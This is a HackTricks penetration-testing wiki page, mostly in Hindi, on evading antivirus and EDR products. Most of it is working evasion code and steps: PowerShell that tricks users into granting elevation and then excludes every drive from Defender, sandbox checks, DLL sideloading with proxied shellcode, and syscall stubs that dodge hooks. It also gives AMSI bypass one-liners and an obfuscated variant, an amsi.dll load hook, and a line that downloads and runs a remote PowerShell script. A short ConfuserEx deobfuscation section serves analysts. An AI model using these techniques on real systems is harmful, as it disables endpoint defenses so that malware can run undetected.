# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**यह पेज मूल रूप से** [**@m2rc_p**](https://twitter.com/m2rc_p)**द्वारा लिखा गया था!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender को काम करने से रोकने का एक tool।
- [no-defender](https://github.com/es3n1n/no-defender): Windows Defender को काम करने से रोकने का एक tool जो दूसरे AV की नकल करता है।
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Defender के साथ tampering करने से पहले installer-style UAC bait

Game cheats के रूप में masquerade करने वाले public loaders अक्सर unsigned Node.js/Nexe installers के रूप में ship होते हैं जो पहले **user से elevation मांगते हैं** और उसके बाद Defender को neuter करते हैं। Flow सरल है:

1. `net session` के साथ administrative context probe करें। यह command सिर्फ तभी succeed होती है जब caller के पास admin rights हों, इसलिए failure का मतलब है कि loader standard user के रूप में चल रहा है।
2. Original command line को preserve करते हुए expected UAC consent prompt trigger करने के लिए तुरंत `RunAs` verb के साथ खुद को relaunch करें।
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
पीड़ित पहले से ही मानते हैं कि वे “cracked” software install कर रहे हैं, इसलिए prompt आमतौर पर accept कर लिया जाता है, जिससे malware को Defender की policy बदलने के लिए जरूरी rights मिल जाते हैं।

### हर drive letter के लिए Blanket `MpPreference` exclusions

एक बार elevated होने पर, GachiLoader-style chains service को outright disable करने के बजाय Defender blind spots को maximize करती हैं। loader पहले GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) को kill करता है और फिर **extremely broad exclusions** push करता है ताकि हर user profile, system directory, और removable disk unscannable हो जाए:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
मुख्य अवलोकन:

- loop हर mounted filesystem (D:\, E:\, USB sticks, आदि) पर चलता है, इसलिए **disk पर कहीं भी छोड़ा गया कोई भी future payload ignore हो जाता है**।
- `.sys` extension exclusion future-oriented है—attackers बाद में unsigned drivers load करने का option reserve करते हैं, बिना Defender को दोबारा touch किए।
- सारे changes `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` के अंदर land करते हैं, जिससे बाद के stages यह confirm कर सकते हैं कि exclusions persist हैं या UAC को फिर से trigger किए बिना उन्हें expand कर सकते हैं।

क्योंकि कोई Defender service stop नहीं होती, naive health checks फिर भी “antivirus active” report करते रहते हैं, जबकि real-time inspection उन paths को कभी touch नहीं करती।

## **AV Evasion Methodology**

Currently, AVs file malicious है या नहीं, यह check करने के लिए अलग-अलग methods use करते हैं: static detection, dynamic analysis, और अधिक advanced EDRs के लिए behavioural analysis।

### **Static detection**

Static detection हासिल की जाती है binary या script में known malicious strings या bytes arrays को flag करके, और file से खुद information extract करके भी (e.g. file description, company name, digital signatures, icon, checksum, etc.). इसका मतलब है कि known public tools use करने पर आप ज़्यादा आसानी से पकड़े जा सकते हैं, क्योंकि संभवतः उन्हें already analyze करके malicious flag कर दिया गया है। इस तरह की detection से बचने के कुछ तरीके हैं:

- **Encryption**

अगर आप binary encrypt करते हैं, तो AV के पास आपका program detect करने का कोई way नहीं रहेगा, लेकिन आपको program को memory में decrypt और run करने के लिए किसी loader की ज़रूरत होगी।

- **Obfuscation**

कभी-कभी बस binary या script में कुछ strings बदल देना ही AV से बचने के लिए काफी होता है, लेकिन यह इस बात पर निर्भर करते हुए समय लेने वाला काम हो सकता है कि आप क्या obfuscate कर रहे हैं।

- **Custom tooling**

अगर आप अपने खुद के tools develop करते हैं, तो कोई known bad signatures नहीं होंगे, लेकिन इसमें बहुत समय और effort लगता है।

> [!TIP]
> Windows Defender static detection के against check करने का एक अच्छा तरीका है [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). यह basically file को multiple segments में split करता है और फिर Defender को हर segment separately scan करने के लिए task देता है, इस तरह यह आपको exactly बता सकता है कि आपकी binary में कौन-सी strings या bytes flagged हैं।

मैं strongly recommend करता हूँ कि आप practical AV Evasion पर यह [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) देखें।

### **Dynamic analysis**

Dynamic analysis तब होती है जब AV आपकी binary को sandbox में run करता है और malicious activity देखता है (e.g. browser passwords decrypt करके पढ़ने की कोशिश करना, LSASS पर minidump करना, etc.). यह हिस्सा थोड़ा tricky हो सकता है, लेकिन sandboxes से बचने के लिए आप कुछ चीजें कर सकते हैं।

- **Sleep before execution** यह implementation पर निर्भर करता है, लेकिन AV की dynamic analysis bypass करने का यह एक अच्छा तरीका हो सकता है। AVs के पास files scan करने के लिए बहुत कम समय होता है ताकि user के workflow में interruption न आए, इसलिए long sleeps binaries की analysis disturb कर सकते हैं। समस्या यह है कि कई AV sandboxes, implementation पर निर्भर करते हुए, sleep को skip कर सकती हैं।
- **Checking machine's resources** आमतौर पर Sandboxes के पास काम करने के लिए बहुत कम resources होते हैं (e.g. < 2GB RAM), वरना वे user की machine को slow down कर सकती हैं। यहाँ आप बहुत creative भी हो सकते हैं, उदाहरण के लिए CPU temperature या fan speeds check करके; sandbox में हर चीज़ implement नहीं होगी।
- **Machine-specific checks** अगर आप ऐसे user को target करना चाहते हैं जिसकी workstation `"contoso.local"` domain में joined है, तो आप computer के domain पर check करके देख सकते हैं कि वह आपके specified domain से match करता है या नहीं; अगर match नहीं करता, तो आप अपने program को exit करा सकते हैं।

पता चला है कि Microsoft Defender के Sandbox computername `HAL9TH` है, इसलिए आप detonation से पहले अपने malware में computer name check कर सकते हैं; अगर name `HAL9TH` match करता है, तो इसका मतलब है कि आप defender के sandbox के अंदर हैं, इसलिए आप अपने program को exit करा सकते हैं।

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes के against [@mgeeky](https://twitter.com/mariuszbit) के कुछ और बहुत अच्छे tips

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

जैसा कि हमने इस post में पहले कहा है, **public tools** अंततः **detected हो जाएंगे**, इसलिए आपको खुद से एक सवाल पूछना चाहिए:

उदाहरण के लिए, अगर आप LSASS dump करना चाहते हैं, **तो क्या आपको सचमुच mimikatz use करना चाहिए**? या आप कोई और project use कर सकते हैं जो कम जाना-पहचाना हो और LSASS dump भी करता हो।

सही जवाब शायद दूसरा वाला है। mimikatz को example के तौर पर लें: यह शायद AVs और EDRs द्वारा सबसे ज़्यादा flagged malware में से एक है, अगर सबसे ज़्यादा flagged नहीं भी है। जबकि यह project खुद बहुत cool है, इसके साथ AVs से बचकर काम करना भी एक nightmare है, इसलिए जो आप achieve करना चाहते हैं उसके लिए alternatives ढूँढें।

> [!TIP]
> Evasion के लिए अपने payloads modify करते समय, defender में **automatic sample submission off** करना सुनिश्चित करें, और seriously, अगर आपका goal long run में evasion achieve करना है तो **DO NOT UPLOAD TO VIRUSTOTAL**। अगर आप check करना चाहते हैं कि आपका payload किसी particular AV से detect होता है या नहीं, तो उसे VM पर install करें, automatic sample submission बंद करने की कोशिश करें, और वहाँ test करें जब तक आप result से satisfied न हों।

## EXEs vs DLLs

जब भी संभव हो, हमेशा **evasion के लिए DLLs use करने को प्राथमिकता दें**। मेरे experience में, DLL files आमतौर पर **काफी कम detected** और analyzed होती हैं, इसलिए कुछ cases में detection से बचने के लिए यह एक बहुत simple trick है (अगर आपके payload के पास DLL के रूप में run होने का कोई तरीका हो, of course)।

जैसा कि हम इस image में देख सकते हैं, Havoc का एक DLL Payload antiscan.me पर 4/26 detection rate देता है, जबकि EXE payload का detection rate 7/26 है।

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

अब हम कुछ tricks दिखाएँगे जिन्हें आप DLL files के साथ और ज़्यादा stealthy बनने के लिए use कर सकते हैं।

## DLL Sideloading & Proxying

**DLL Sideloading** loader द्वारा इस्तेमाल किए जाने वाले DLL search order का फायदा उठाता है, victim application और malicious payload(s) को एक-दूसरे के साथ side by side रखकर।

आप [Siofra](https://github.com/Cybereason/siofra) और निम्न powershell script का उपयोग करके DLL Sideloading के लिए susceptible programs check कर सकते हैं:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
यह कमांड "C:\Program Files\\" के अंदर DLL hijacking के लिए susceptible programs की list और वे DLL files जिन्हें वे load करने की कोशिश करते हैं, output करेगी।

मैं strongly recommend करता हूँ कि आप **खुद DLL Hijackable/Sideloadable programs explore करें**, यह technique proper तरीके से use करने पर काफी stealthy होती है, लेकिन अगर आप publicly known DLL Sideloadable programs use करते हैं, तो आप आसानी से पकड़े जा सकते हैं।

सिर्फ उस नाम की malicious DLL रख देने से जिसे program load करना expect करता है, आपका payload load नहीं होगा, क्योंकि program उस DLL के अंदर कुछ specific functions expect करता है; इस issue को ठीक करने के लिए, हम एक और technique का use करेंगे जिसे **DLL Proxying/Forwarding** कहते हैं।

**DLL Proxying** program द्वारा proxy (और malicious) DLL से की गई calls को original DLL की ओर forward करता है, जिससे program की functionality बनी रहती है और आपके payload के execution को handle किया जा सकता है।

मैं [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project from [@flangvik](https://twitter.com/Flangvik/) का use करूंगा

मैंने ये steps follow किए:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
अंतिम कमांड हमें 2 फाइलें देगा: एक DLL source code template, और original renamed DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
ये रहे परिणाम:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

हमारे shellcode (जो [SGN](https://github.com/EgeBalci/sgn) से encoded है) और proxy DLL दोनों का [antiscan.me](https://antiscan.me) पर 0/26 Detection rate है! मैं इसे success कहूँगा।

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> मैं **बहुत strongly recommend** करता हूँ कि आप DLL Sideloading के बारे में [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) और साथ ही [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) देखें, ताकि हम जिन बातों पर चर्चा कर चुके हैं उन्हें और गहराई से समझ सकें।

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules functions export कर सकते हैं जो असल में "forwarders" होते हैं: code की ओर point करने के बजाय, export entry में `TargetDll.TargetFunc` form की एक ASCII string होती है। जब कोई caller export resolve करता है, तो Windows loader:

- अगर `TargetDll` पहले से loaded नहीं है, तो उसे load करेगा
- उससे `TargetFunc` resolve करेगा

समझने योग्य key behaviors:
- अगर `TargetDll` एक KnownDLL है, तो उसे protected KnownDLLs namespace से supply किया जाता है (जैसे ntdll, kernelbase, ole32)।
- अगर `TargetDll` एक KnownDLL नहीं है, तो normal DLL search order इस्तेमाल होता है, जिसमें उस module की directory भी शामिल होती है जो forward resolution कर रहा है।

इससे एक indirect sideloading primitive संभव होती है: ऐसी signed DLL खोजें जो किसी function को एक non-KnownDLL module name पर forward करती हो, फिर उस signed DLL को एक attacker-controlled DLL के साथ same location पर रखें जिसका नाम बिल्कुल forwarded target module जैसा हो। जब forwarded export invoke होता है, loader forward resolve करता है और आपकी DLL को same directory से load करता है, जिससे आपका DllMain execute होता है।

Windows 11 पर observed example:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` एक KnownDLL नहीं है, इसलिए यह normal search order के माध्यम से resolve होता है।

PoC (copy-paste):
1) signed system DLL को एक writable folder में copy करें
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) उसी folder में एक malicious `NCRYPTPROV.dll` drop करें। code execution पाने के लिए एक minimal DllMain पर्याप्त है; DllMain trigger करने के लिए आपको forwarded function implement करने की जरूरत नहीं है।
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) एक signed LOLBin के साथ forward trigger करें:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) side-by-side `keyiso.dll` (signed) को load करता है
- `KeyIsoSetAuditingInterface` को resolve करते समय, loader forward को `NCRYPTPROV.SetAuditingInterface` तक follow करता है
- फिर loader `C:\test` से `NCRYPTPROV.dll` load करता है और उसका `DllMain` execute करता है
- अगर `SetAuditingInterface` implement नहीं है, तो आपको "missing API" error केवल `DllMain` पहले से run हो जाने के बाद मिलेगा

Hunting tips:
- उन forwarded exports पर focus करें जहाँ target module कोई KnownDLL नहीं है। KnownDLLs `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` के under listed होते हैं।
- आप forwarded exports को tooling जैसे: के साथ enumerate कर सकते हैं
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- संभावित candidates खोजने के लिए Windows 11 forwarder inventory देखें: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- LOLBins (जैसे, rundll32.exe) को non-system paths से signed DLLs लोड करते हुए monitor करें, और उसके बाद उसी directory से same base name वाली non-KnownDLLs को लोड करते हुए देखें
- ऐसे process/module chains पर alert करें जैसे: `rundll32.exe` → non-system `keyiso.dll` → user-writable paths के तहत `NCRYPTPROV.dll`
- code integrity policies (WDAC/AppLocker) enforce करें और application directories में write+execute deny करें

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

आप अपने shellcode को stealthy तरीके से load और execute करने के लिए Freeze का उपयोग कर सकते हैं।
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion बस एक cat & mouse game है, जो आज काम करता है उसे कल detect किया जा सकता है, इसलिए कभी भी सिर्फ एक tool पर rely मत करो, अगर possible हो तो multiple evasion techniques को chain करने की कोशिश करो।

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs अक्सर `ntdll.dll` syscall stubs पर **user-mode inline hooks** लगाते हैं। इन hooks को bypass करने के लिए, आप **direct** या **indirect** syscall stubs generate कर सकते हैं जो सही **SSN** (System Service Number) load करते हैं और hooked export entrypoint execute किए बिना kernel mode में transition करते हैं।

**Invocation options:**
- **Direct (embedded)**: generated stub में `syscall`/`sysenter`/`SVC #0` instruction emit करें (कोई `ntdll` export hit नहीं होता)।
- **Indirect**: `ntdll` के अंदर मौजूद किसी existing `syscall` gadget में jump करें ताकि kernel transition `ntdll` से originate होता हुआ लगे (heuristic evasion के लिए useful); **randomized indirect** हर call के लिए pool से एक gadget चुनता है।
- **Egg-hunt**: disk पर static `0F 05` opcode sequence embed करने से बचें; runtime पर एक syscall sequence resolve करें।

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stub bytes पढ़ने के बजाय syscall stubs को virtual address के हिसाब से sort करके SSNs infer करें।
- **SyscallsFromDisk**: एक clean `\KnownDlls\ntdll.dll` map करें, उसकी `.text` से SSNs read करें, फिर unmap करें (all in-memory hooks bypass होते हैं)।
- **RecycledGate**: जब stub clean हो तो opcode validation के साथ VA-sorted SSN inference combine करें; अगर stub hooked हो तो VA inference पर fall back करें।
- **HW Breakpoint**: `syscall` instruction पर DR0 set करें और runtime पर `EAX` से SSN capture करने के लिए VEH use करें, बिना hooked bytes parse किए।

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI को "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" को रोकने के लिए बनाया गया था। शुरुआत में, AVs केवल **disk पर files** scan कर सकते थे, इसलिए अगर आप somehow payloads को **directly in-memory** execute कर पाते, तो AV उसे रोकने के लिए कुछ नहीं कर सकता था, क्योंकि उसके पास enough visibility नहीं होती थी।

AMSI feature Windows के इन components में integrated है।

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

यह antivirus solutions को script contents को ऐसे form में expose करके script behavior inspect करने देता है जो both unencrypted और unobfuscated होता है।

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` चलाने पर Windows Defender में following alert आएगा।

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यह पहले `amsi:` जोड़ता है और फिर उस executable का path देता है जिससे script run हुई, इस case में, powershell.exe

हमने कोई file disk पर drop नहीं की, फिर भी AMSI की वजह से in-memory पकड़े गए।

इसके अलावा, **.NET 4.8** से शुरू होकर, C# code भी AMSI के through run होता है। यह `Assembly.Load(byte[])` को भी affect करता है ताकि in-memory execution load हो सके। इसलिए, अगर आप AMSI evade करना चाहते हैं, तो in-memory execution के लिए .NET के lower versions (जैसे 4.7.2 या उससे नीचे) use करने की recommendation की जाती है।

AMSI को bypass करने के कुछ तरीके हैं:

- **Obfuscation**

चूंकि AMSI मुख्य रूप से static detections पर काम करता है, इसलिए जिन scripts को आप load करने की कोशिश करते हैं उन्हें modify करना detection evade करने का अच्छा तरीका हो सकता है।

हालांकि, AMSI में scripts को unobfuscate करने की capability होती है, भले ही उनमें multiple layers हों, इसलिए obfuscation कैसे की गई है उस पर depend करते हुए यह खराब option हो सकता है। इससे evade करना इतना straightforward नहीं रहता। फिर भी, कभी-कभी आपको सिर्फ कुछ variable names बदलने की जरूरत होती है और काम हो जाता है, इसलिए यह इस पर depend करता है कि किसी चीज़ को कितना flag किया गया है।

- **AMSI Bypass**

चूंकि AMSI को powershell (साथ ही cscript.exe, wscript.exe, आदि) process में एक DLL load करके implement किया गया है, इसलिए इसे आसानी से tamper किया जा सकता है, even अगर आप unprivileged user के रूप में run कर रहे हों। AMSI के implementation में इस flaw के कारण, researchers ने AMSI scanning evade करने के multiple ways पाए हैं।

**Forcing an Error**

AMSI initialization को fail करवाना (amsiInitFailed) result करेगा कि current process के लिए कोई scan initiate नहीं होगा। Originally यह [Matt Graeber](https://twitter.com/mattifestation) द्वारा disclose किया गया था और Microsoft ने wider usage को रोकने के लिए एक signature develop की है।
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
बस एक line of powershell code की ज़रूरत थी ताकि current powershell process के लिए AMSI unusable हो जाए। यह line, ज़ाहिर है, AMSI द्वारा itself flagged कर दी गई थी, इसलिए इस technique का use करने के लिए कुछ modification needed है।

यहाँ एक modified AMSI bypass है जो मैंने इस [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) से लिया है।
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
ध्यान रखें, कि यह संभवतः इस पोस्ट के आने के बाद फ्लैग किया जाएगा, इसलिए यदि आपका प्लान undetected रहना है तो आपको कोई code publish नहीं करना चाहिए।

**Memory Patching**

यह technique सबसे पहले [@RastaMouse](https://twitter.com/_RastaMouse/) द्वारा discovered की गई थी और इसमें amsi.dll में "AmsiScanBuffer" function का address ढूँढना शामिल है (जो user-supplied input को scan करने के लिए जिम्मेदार है) और उसे ऐसे instructions से overwrite करना जो E_INVALIDARG का code return करें; इस तरह, actual scan का result 0 return करेगा, जिसे clean result के रूप में interpret किया जाता है।

> [!TIP]
> अधिक detailed explanation के लिए कृपया [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) पढ़ें।

PowerShell के साथ AMSI bypass करने के लिए कई अन्य techniques भी हैं, अधिक जानने के लिए [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) और [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) देखें।

### LdrLoadDll hook के जरिए amsi.dll load को रोककर AMSI को block करना

AMSI केवल तब initialised होता है जब `amsi.dll` current process में loaded हो जाता है। एक robust, language‑agnostic bypass यह है कि `ntdll!LdrLoadDll` पर एक user‑mode hook लगाया जाए जो तब error return करे जब requested module `amsi.dll` हो। इसके परिणामस्वरूप, AMSI कभी load नहीं होता और उस process के लिए कोई scan नहीं होता।

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- PowerShell, WScript/CScript और custom loaders जैसे सभी पर काम करता है (ऐसी किसी भी चीज़ पर जो otherwise AMSI लोड करती)।
- लंबे command-line artefacts से बचने के लिए scripts को stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) के जरिए feed करने के साथ pair करें।
- LOLBins के जरिए executed loaders में इसका उपयोग देखा गया है (जैसे, `regsvr32` का `DllRegisterServer` कॉल करना)।

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Remove the detected signature**

आप **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** और **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** जैसे tool का उपयोग current process की memory से detected AMSI signature हटाने के लिए कर सकते हैं। यह tool current process की memory में AMSI signature को scan करके और फिर उसे NOP instructions से overwrite करके काम करता है, जिससे वह effectively memory से हट जाती है।

**AV/EDR products that uses AMSI**

आप **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** में AMSI का उपयोग करने वाले AV/EDR products की list पा सकते हैं।

**Use Powershell version 2**
यदि आप PowerShell version 2 का उपयोग करते हैं, तो AMSI load नहीं होगा, इसलिए आप अपने scripts को AMSI द्वारा scan किए बिना run कर सकते हैं। आप यह कर सकते हैं:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging एक feature है जो आपको system पर execute होने वाले सभी PowerShell commands को log करने देता है। यह auditing और troubleshooting के लिए useful हो सकता है, लेकिन यह **उन attackers के लिए भी एक problem हो सकता है जो detection से बचना चाहते हैं**।

PowerShell logging bypass करने के लिए, आप निम्न techniques का उपयोग कर सकते हैं:

- **Disable PowerShell Transcription and Module Logging**: आप इस उद्देश्य के लिए [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) जैसा tool उपयोग कर सकते हैं।
- **Use Powershell version 2**: यदि आप PowerShell version 2 उपयोग करते हैं, तो AMSI load नहीं होगा, इसलिए आप अपनी scripts को AMSI द्वारा scanned हुए बिना run कर सकते हैं। आप यह कर सकते हैं: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) का उपयोग करके defenses के बिना एक powershell spawn करें (यही `powerpick` from Cobal Strike उपयोग करता है)。


## Obfuscation

> [!TIP]
> कई obfuscation techniques data को encrypt करने पर निर्भर करती हैं, जिससे binary की entropy बढ़ जाएगी और AVs और EDRs के लिए इसे detect करना आसान हो जाएगा। इसमें सावधान रहें और शायद encryption केवल आपके code के उन specific sections पर लागू करें जो sensitive हैं या जिन्हें छिपाने की आवश्यकता है।

### Deobfuscating ConfuserEx-Protected .NET Binaries

जब ConfuserEx 2 (या commercial forks) का उपयोग करने वाले malware का analysis करते हैं, तो अक्सर कई layers of protection का सामना करना पड़ता है जो decompilers और sandboxes को block कर देंगी। नीचे दिया गया workflow विश्वसनीय रूप से **near–original IL को restore** करता है, जिसे बाद में dnSpy या ILSpy जैसे tools में C# में decompile किया जा सकता है।

1.  Anti-tampering removal – ConfuserEx हर *method body* को encrypt करता है और उसे *module* static constructor (`<Module>.cctor`) के अंदर decrypt करता है। यह PE checksum को भी patch करता है, इसलिए कोई भी modification binary को crash कर देगा। encrypted metadata tables locate करने, XOR keys recover करने और clean assembly rewrite करने के लिए **AntiTamperKiller** का उपयोग करें:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output में 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) होते हैं, जो अपना unpacker बनाते समय उपयोगी हो सकते हैं।

2.  Symbol / control-flow recovery – *clean* file को **de4dot-cex** (de4dot का ConfuserEx-aware fork) में feed करें।
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profile select करें
• de4dot control-flow flattening को undo करेगा, original namespaces, classes और variable names restore करेगा और constant strings decrypt करेगा।

3.  Proxy-call stripping – ConfuserEx direct method calls को lightweight wrappers (a.k.a *proxy calls*) से replace करता है ताकि decompilation और टूटे। इन्हें **ProxyCall-Remover** से remove करें:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
इस step के बाद आपको `Convert.FromBase64String` या `AES.Create()` जैसे normal .NET API दिखाई देने चाहिए, opaque wrapper functions (`Class8.smethod_10`, …) के बजाय।

4.  Manual clean-up – resulting binary को dnSpy में run करें, बड़े Base64 blobs या `RijndaelManaged`/`TripleDESCryptoServiceProvider` के use को search करें ताकि *real* payload locate हो सके। अक्सर malware इसे `<Module>.byte_0` के अंदर initialize किए गए TLV-encoded byte array के रूप में store करता है।

ऊपर दिया गया chain malicious sample को run किए बिना execution flow को **restore** करता है – offline workstation पर काम करते समय यह useful है।

> 🛈  ConfuserEx `ConfusedByAttribute` नामक एक custom attribute produce करता है, जिसे samples को automatically triage करने के लिए IOC के रूप में उपयोग किया जा सकता है।

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
